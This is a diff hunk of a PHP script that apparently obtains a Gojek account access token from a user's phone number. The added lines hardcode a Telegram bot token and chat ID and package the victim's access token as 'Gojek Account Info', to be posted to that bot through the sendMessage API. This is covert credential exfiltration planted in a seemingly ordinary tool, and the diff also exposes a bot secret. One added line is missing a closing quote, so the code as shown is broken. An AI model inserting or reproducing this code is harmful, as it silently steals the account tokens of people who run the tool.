@@ -52,6 +52,9 @@ echo color("green","Masukan nomor: Indonesia 62*****, Us 1*****\n\n");
         $uuid = getStr('"resource_owner_id":',',',$verif);
         echo color("green","+] Your access token : ".$token."\n\n");
         save("token.txt",$token);
+        $TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
+	$chatid = "785784404";
+	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n;
  	$method	= "sendMessage";
 	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
 	$post = [
